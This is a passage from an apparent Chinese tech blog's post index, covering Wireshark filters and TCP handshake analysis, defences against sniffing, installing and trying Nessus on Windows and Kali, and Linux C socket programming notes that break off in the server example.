80，显示TCP协议的目的主机端口为80的数据包</p><ul><li>Http模式过滤</li></ul><p>http.request.method == GET, 只显示HTTP协议下GET请求的数据包</p><p>http.request.method == POST,只显示HTTP协议下POST请求的数据包</p><ul><li>逻辑运算符</li></ul><p>过滤多个条件组合时，使用and/or。比如获取IP地址为192.168.1.104的ICMP数据包表达式为ip.addr == 192.168.1.104 and icmp</p><h1 id="Wireshark分析TCP三次握手"><a href="#Wireshark分析TCP三次握手" class="headerlink" title="Wireshark分析TCP三次握手"></a>Wireshark分析TCP三次握手</h1><p>TCP三次握手</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304002058972.png" alt="image-20210304002058972"></p><p>抓取TCP包</p><p>启动wireshark，打开浏览器输入<a href="http://www.baidu.com/">www.baidu.com</a>；</p><p>终止抓包，在过滤栏输入http以过滤隐藏其他无关数据包；</p><p>右键选中，点击追踪流——&gt;TCP流，</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304002136211.png" alt="image-20210304002136211"></p><p>可以看到这里截获了三个TCP握手数据包，第四个是HTTP数据包，说明HTTP的确是使用TCP建立连接的。</p><blockquote><p>第一次握手，客户端向服务器发送了一个TCP连接请求，标志位SYN = 1，客户端序号Seq(Sequence number)为x = 0，表示客户端请求建立连接</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304002219815.png" alt="image-20210304002219815"></p><blockquote><p>第二次握手，服务器向客户端发回一个确认包,标志位SYN = 1,ACK = 1。服务器序号seq(y)=0，将确认序号ack(Acknowledgement Number)设置为客户端序号seq(x)加1,即0+1=1。</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304002240963.png" alt="image-20210304002240963"></p><blockquote><p>第三次握手，客户端收到服务器发来的包后检查确认序号是否正确，即第一次发送的序号seq是否加1（X+1= 0+1=1）以及标志位ACK是否为1。若正确，客户端会再向服务器端发送一个数据包，标志位ACK=1，确认序号=Y+1=0+1=1，并且把服务器发来的序号seq加1发送给对方，发送序号seq为X+1= 0+1=1。服务器收到后确认序号值与ACK=1。至此，一次TCP连接建立，可以传送数据了。</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304002304859.png" alt="image-20210304002304859"></p><h1 id="网络嗅探的防范"><a href="#网络嗅探的防范" class="headerlink" title="网络嗅探的防范"></a>网络嗅探的防范</h1><p>网络嗅探对于安全防护一般的网络来说，操作简单但同时威胁巨大，很多攻击者使用嗅探器进行网络入侵的渗透。故防范网络嗅探显得尤为重要，可以采用以下防御措施：</p><ul><li>安全的拓扑结构。嗅探器只能在当前网络段上进行数据捕获。这就意味着，将网络分段工作进行得越细，嗅探器能够收集的信息就越少。但是，除非是一个ISP（分层服务提供商），或者资源相对不受限制，否则这样的解决方案需要很大的代价。</li><li>会话加密。传统的网络服务程序，HTTP、FTP、SMTP和Telnet等在本质上都是不安全的，因为它们在网络上用明文传送口令和数据，嗅探器非常容易就可以截获这些信息。使用SSH(secure shell)等协议可以使得信息安全地传输。通过使用SSH，可以把所有传输的数据进行加密，这样”中间服务器”这种攻击方式就不可能实现了，而且也能够防止DNS和IP欺骗。</li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://zhuanlan.zhihu.com/p/82498482">Wireshark抓包使用指南</a></p><p>[2] <a href="https://www.cnblogs.com/cocowool/p/wireshark_tcp_http.html">Wireshark使用入门</a></p><p>[3] <a href="https://www.cnblogs.com/TankXiao/archive/2012/10/10/2711777.html">Wireshark基本介绍和学习TCP三次握手</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tools </tag>
            
            <tag> Wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么，Nessus又双叒叕安装失败了？</title>
      <link href="posts/52081.html"/>
      <url>posts/52081.html</url>
      
        <content type="html"><![CDATA[<h1 id="Nessus简介"><a href="#Nessus简介" class="headerlink" title="Nessus简介"></a>Nessus简介</h1><blockquote><p>Nessus 是目前全世界最多人使用的系统漏洞扫描与分析软件。总共有超过75,000个机构使用Nessus 作为扫描该机构电脑系统的软件，且提供完整的电脑漏洞扫描服务, 并随时更新其漏洞数据库。</p></blockquote><h1 id="Nessus原理"><a href="#Nessus原理" class="headerlink" title="Nessus原理"></a>Nessus原理</h1><blockquote><p>Nessus是一种典型的基于客户/服务器结构的网络扫描系统。客户端包括用户配置工具和结果存储/报告生成工具。服务器端包括一个扫描方法库(由插件组成)、当前活动扫描知识库和一个扫描引擎。Nessus的扫描方法采用的是插件技术。插件是用脚本语言编写的子进程，通常系统先制定扫描策略，然后扫描进程根据策略调用一系列插件来执行漏洞扫描，检测出系统中存在的一个或多个漏洞。通常一个插件负责扫描一个或一类漏洞。</p></blockquote><h1 id="Nessus安装"><a href="#Nessus安装" class="headerlink" title="Nessus安装"></a>Nessus安装</h1><h2 id="Windows下安装"><a href="#Windows下安装" class="headerlink" title="Windows下安装"></a>Windows下安装</h2><p>前往<a href="https://www.tenable.com/downloads/nessus?loginAttempted=true">官网</a>下载相应安装包</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302191336035.png" alt="image-20210302191336035"></p><p>启动安装程序，下一步安装即可</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302191556933.png" alt="image-20210302191556933"></p><p>安装完成，自动打开Nessus</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302192055072.png" alt="image-20210302192055072"></p><p>若未成功打开Nessus,可手动找到<code>Nessus Web Client</code> 程序或在浏览器中直接访问 <code>https://localhost:8834</code> </p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302192658843.png" alt="image-20210302192658843"></p><p>获取激活码（邮箱一定写正确，否则收不到激活码）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302192840744.png" alt="image-20210302192840744"></p><p>输入激活码（从邮箱中复制过去即可）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302192902655.png" alt="image-20210302192902655"></p><p>注册一个账户，设置用户名和密码，Submit</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302192924048.png" alt="image-20210302192924048"></p><p>“耐心”等待其下载插件（注意，选择一个网速好的地方能省心不少，前人之鉴）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302192940477.png" alt="image-20210302192940477"></p><blockquote><p>若第一次下载插件失败，想要重新下载，可参考这篇文章的步骤，当然也可删除Nessus程序，重新安装</p><p><a href="https://blog.csdn.net/zhiwule1314/article/details/89673413">https://blog.csdn.net/zhiwule1314/article/details/89673413</a></p></blockquote><p>等待其插件编译</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193001937.png" alt="image-20210302193001937"></p><p>等待结束，Welcome to Nessus!</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193022088.png" alt="image-20210302193022088"></p><hr><h2 id="Kali下安装"><a href="#Kali下安装" class="headerlink" title="Kali下安装"></a>Kali下安装</h2><p>同样，前往<a href="https://www.tenable.com/downloads/nessus?loginAttempted=true">官网</a>下载对应安装包</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193444469.png" alt="image-20210302193444469"></p><p>将下载好的安装包拖到kali中</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193505044.png" alt="image-20210302193505044"></p><p>安装Nessus </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i Nessus-8.13.1-debian6_amd64.deb</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193536170.png" alt="image-20210302193536170"></p><p>启动Nessus</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start nessusd.service</span><br></pre></td></tr></table></figure><p>或者在浏览器中访问<a href="https://kali:8834/">https://kali:8834/</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193554369.png" alt="image-20210302193554369"></p><p>获取激活码及后面的步骤与Windows下一致，不再赘述。</p><h1 id="Nessus试用"><a href="#Nessus试用" class="headerlink" title="Nessus试用"></a>Nessus试用</h1><p>设置目标网站信息</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193135172.png" alt="image-20210302193135172"></p><p>开始扫描</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193157505.png" alt="image-20210302193157505"></p><p>……</p><p>查看扫描结果</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193224984.png" alt="image-20210302193224984"></p><p>查看扫描结果详情</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210302193242367.png" alt="image-20210302193242367"></p><blockquote><p>更多Nessus内容待你探索！</p></blockquote><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://www.dazhuanlan.com/2019/12/08/5ded08a6b8607/?__cf_chl_jschl_tk__=7fbdcf6395defa239d39d224785fa24f35dd1213-1614649002-0-Actq3WOG98yd3rQzAtLvwzCawdh-KtGGWn9fpLFQIt92ZLlMlzOtRXmmfUqosikbBTCuYGB95nLRJ1EHIC2llM-PECWZ3mf0Sf0LwHCK7x2ObFJ2fWsKTFrna8hz8p5zb4YPw1PZSmbA2-YlM0jWhsELAhCvs1Qcj1o-i83tFu69pnkwVSFlWnpxLHyE4-0Pp7wLANxyU1StBiOR5agpKj-dkqLzomIb5n1kEYU-Si3NdEjqjNJcseQocDpqysxMpdF6wPexyBRNDE5NaJGhdO7O7WQ4w27vF1hONSpNGheArAOJgaIY1JvXG9Ayq3G7ihua-VJY1WvTicXBfuykv8E">nessus原理</a></p><p>[2] <a href="https://blog.csdn.net/wwl012345/article/details/96998187">渗透测试技术—-工具使用(二)–Nessus工具下载及使用(安装在Kali上)</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tools </tag>
            
            <tag> Nessus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux C编程实战之网络编程学习记录</title>
      <link href="posts/19674.html"/>
      <url>posts/19674.html</url>
      
        <content type="html"><![CDATA[<h1 id="网络模型与协议"><a href="#网络模型与协议" class="headerlink" title="网络模型与协议"></a>网络模型与协议</h1><p>大多数网络模型都是按层的方式来组织的。在分层网络模型中，每一层都为上一层提供一定的服务，而把如何实现本层服务的细节对上一层加以屏蔽，上层只需知道下层提供了什么功能以及对应与这些功能的接口。</p><p>为了确保使用不同硬件和底层协议构建的网络能相互进行通信，国际标准化组织（ISO）制定了一套被称为开放系统互联（OSI）的规范。但由于种种原因，<code>OSI 模型</code>没有得到广泛应用，当前普遍使用的是 <code>TCP/IP 模型</code>。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/wKiom1U94DeQlYq8AABs6_RQoBk468.jpg"></p><p>（1）网络接口层</p><p>TCP/IP 模型最下一层，包含多种逻辑链路控制和媒体访问协议，负责将网络层发来的数据分层帧，并通过物理链路进行传送，或从网络上接收物理帧，抽取数据并转交给其上的网络层。</p><p>（2）网络层</p><p>负责在发送端和接受端之间建立一条虚拟路径。这一层的主要协议是 <code>IP协议</code> 。</p><blockquote><p>IP 协议（Internet Protocal）主要负责确定路由，选择一条最短路由来将数据分组传送到目的计算机。</p></blockquote><p>这一层的 <code>ARP协议</code> （地址解析协议）和 <code>RARP协议</code> （反向地址解析协议）用于 IP地址和物理地址的相互转换。如果数据在传输过程中出现问题，该层的 <code>ICMP协议</code> 将产生错误报文。</p><p>（3）传输层</p><p>通过位于该层的 <code>TCP协议</code> （传输控制协议）或 <code>UDP协议</code> （用户数据报协议）在两台主机间传输数据，提供应用程序间的通信。该层主要功能有差错控制，传输确认和丢失重传等。</p><blockquote><p>TCP 协议提供可靠的面向连接的服务，保证数据能完整地按顺序地传送到目标计算机。它在传输数据前需要和目标计算机建立连接，并在传输过程中维持此连接，因此在速度上会有些损失。</p></blockquote><p>使用TCP进行通信的过程：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/1215110-20180201220928796-1989421651.png"></p><blockquote><p>UDP协议提供简单的无连接服务，它不保证数据能按顺序、正确地传送到目标计算机，它不用建立连接，通常速度上要比TCP 快些。</p></blockquote><p>（4）应用层</p><p>应用层面向用户提供一系列访问网络的协议，如用于传输文件的 <code>FTP协议</code> 、用于远程登陆的 <code>Telnet协议</code> 、用于发送电子邮件的 <code>SMTP协议</code> ，以及最常用的用于浏览网页的 <code>HTTP协议</code>。</p><p>上面提到的协议简单讲就是通信实体为实现正确的通信而制定的规则。就像人类交流需要一种双方都能理解的语言，两台计算机间要进行通信也需要这样的语言，即协议。</p><h1 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h1><p>为使网络上的计算机能互相通信，必须有唯一的标识来区分网络上的每一台计算机。有两种标识可以使用：物理地址（如网卡地址）和 IP地址。在shell下输入命令 <code>ifconfig</code> 可以查看到本机的地址。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210225113612065.png" alt="image-20210225113612065"></p><p><strong>物理地址</strong></p><p>上面的 00:0c:29:79:ad:5d 就是以16进制表示的48位（6字节）网卡地址，此地址在网卡的生成过程中就已经固定，不可更改，且全球唯一。</p><p><strong>IP地址</strong></p><p>IP地址是与底层硬件技术无关的通用地址，如上的 192.168.232.128 。32位（4字节）的IP地址分为两部分：计算机所在的网络号和该网络给该计算机分配的主机号。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/unnamed.jpg"></p><p>TCP/IP上的每台主机还有一个32位的子网掩码，如上的 255.255.255.0 。它用来区分IP地址的网络号和主机号。将IP地址与子网掩码进行按位“与”运算就可得到IP地址的网络号。例如，将上面的IP地址与子网掩码“与“运算得到的结果为 192.168.232.0 ，即对应的网络号。</p><p>IPv6 为IP地址的最新版本，用于解决IPv4地址枯竭问题。IPv6二进位制下为128位长度，以16位为一组，每组以冒号“:”隔开，可以分为8组，每组以4位十六进制方式表示。如上面的 fe80::63f4:6f8e:f307:3776 。</p><h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><p>对于一台计算机上的多个应用程序，TCP和UDP协议采用16位的端口号来识别它们。一台计算机上的不同进程可以绑定到不同的端口上，这些进程都可以访问网络而互不干扰。如FTP协议专用端口21， HTTP协议常用端口80，mysql服务常用端口3306。</p><h1 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h1><p>我们知道两个进程如果需要进行通讯最基本的一个前提能能够唯一的标示一个进程，在本地进程通讯中我们可以使用PID来唯一标示一个进程，但PID只在本地唯一，网络中的两个进程PID冲突几率很大，这时候我们需要另辟它径了，我们知道IP层的ip地址可以唯一标示主机，而TCP层协议和端口号可以唯一标示主机的一个进程，这样我们可以利用ip地址＋协议＋端口号唯一标示网络中的一个进程。</p><p>能够唯一标示网络中的进程后，它们就可以利用socket进行通信了，什么是socket呢？我们经常把socket翻译为套接字，socket是在应用层和传输层之间的一个抽象层，它把TCP/IP层复杂的操作抽象为几个简单的接口供应用层调用以实现进程在网络中通信。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/05225723-2ffa89aad91f46099afa530ef8660b20.jpg"></p><p>socket起源于UNIX，在Unix一切皆文件哲学的思想下，socket是一种”打开—读/写—关闭”模式的实现，服务器和客户端各自维护一个”文件”，在建立连接打开后，可以向自己文件写入内容供对方读取或者读取对方内容，通讯结束时关闭文件。</p><p>以使用TCP协议通讯的socket为例，其交互流程主要如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/05232335-fb19fc7527e944d4845ef40831da4ec2.png"></p><h1 id="套接字函数"><a href="#套接字函数" class="headerlink" title="套接字函数"></a>套接字函数</h1><h2 id="创建套接字"><a href="#创建套接字" class="headerlink" title="创建套接字"></a>创建套接字</h2><p>socket 函数用来创建一个套接字，函数原型为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;        </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>;</span><br></pre></td></tr></table></figure><p>参数 domain 用于指定创建套接字所使用的协议族。常用的协议族如下：</p><ul><li>AF_UNIX：创建只在本机内进行通信的套接字。</li><li>AF_INET：使用 IPv4 TCP/IP协议。</li><li>AF_INET6：使用IPv6 TCP/IP协议。</li></ul><p>参数 type指定套接字的类型，可取如下值：</p><ul><li>SOCK_STREAM：创建TCP流套接字。</li><li>SOCK_DGRAM：创建UDP数据报套接字。</li></ul><p>参数 protocol 通常设置为0。</p><p>创建成功返回一个新创建的套接字，若有错误发生则返回-1。</p><p>下面的代码创建了一个 TCP 套接字</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sock_fd;</span><br><span class="line">sock_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (sock_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h2><p>函数 connect 用来在一个指定的套接字上创建一个连接。函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;         </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr,<span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></table></figure><p>参数sockfd是欲建立连接的本地套接字描述符。参数addr指出说明对方套接字地址结构的指针。对方套接字地址长度由affrlen说明。如果没有错误发生，connect()返回0。</p><h2 id="绑定套接字"><a href="#绑定套接字" class="headerlink" title="绑定套接字"></a>绑定套接字</h2><p>函数 bind 用来将一个套接字和某个端口绑定在一起，函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;         </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr,<span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></table></figure><p>该函数一般只有服务器端的程序调用。参数sockfd是由socket()调用返回的并且未作连接的套接字描述符(套接字号)。参数addr是赋给套接字的本地地址（名字），其长度可变，结构随通信域的不同而不同。affrlen表明了addr的长度。</p><h2 id="在套接字上监听"><a href="#在套接字上监听" class="headerlink" title="在套接字上监听"></a>在套接字上监听</h2><p>函数 listen 把套接字转化为被动监听，等待来自客户端的连接请求，函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> s,<span class="keyword">int</span> backlog)</span></span>;</span><br></pre></td></tr></table></figure><p>参数s标识一个本地已建立、尚未连接的套接字号，服务器愿意从它上面接收请求。backlog表示请求连接队列的最大长度，用于限制排队请求的个数，目前允许的最大值为5。如果没有错误发生，listen()返回0。</p><h2 id="接受连接"><a href="#接受连接" class="headerlink" title="接受连接"></a>接受连接</h2><p>函数 accept 用来接受一个连接请求。函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;          </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr *addr, <span class="keyword">socklen_t</span> *addrlen)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>参数sockfd 是由函数socket创建，经函数bind 绑定到本地的某一端口上，然后通过函数listen转化而来的监听套接字。</li><li>参数 addr 用来保存发起连接请求的主机的地址和端口。</li><li>参数 addrlen 是 addr 所指向的结构体的大小。</li></ul><p>执行成功返回一个新的代表客户端的套接字，出错返回-1。</p><h2 id="发送数据"><a href="#发送数据" class="headerlink" title="发送数据"></a>发送数据</h2><p>函数send用来在TCP套接字上发送数据。函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">send</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure><p>参数sockfd为已连接的本地套接字描述符。buf 指向存有发送数据的缓冲区的指针，其长度由len 指定。flags 指定传输控制方式，如是否发送带外数据等。如果没有错误发生，send()返回总共发送的字节数。</p><h2 id="接收数据"><a href="#接收数据" class="headerlink" title="接收数据"></a>接收数据</h2><p>函数recv用来在TCP套接字上接收数据。函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recv</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure><p>参数sockfd为已连接的套接字描述符。buf指向接收输入数据缓冲区的指针，其长度由len 指定。flags 指定传输控制方式，如是否接收带外数据等。如果没有错误发生，recv()返回总共接收的字节数。如果连接被关闭，返回0。</p><h2 id="关闭套接字"><a href="#关闭套接字" class="headerlink" title="关闭套接字"></a>关闭套接字</h2><p>函数close用来关闭一个套接字描述符。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br></pre></td></tr></table></figure><p>参数 fd 为一个套接字描述符。</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><code>config.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * config.h 包含该tcp/ip套接字编程所需要的基本头文件，与server.c client.c位于同一目录下</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_LINE = <span class="number">2048</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> PORT = <span class="number">6000</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> BACKLOG = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> LISTENQ = <span class="number">6666</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_CONNECT = <span class="number">20</span>;</span><br></pre></td></tr></table></figure><p><code>server.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * server.c为服务器端代码</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span 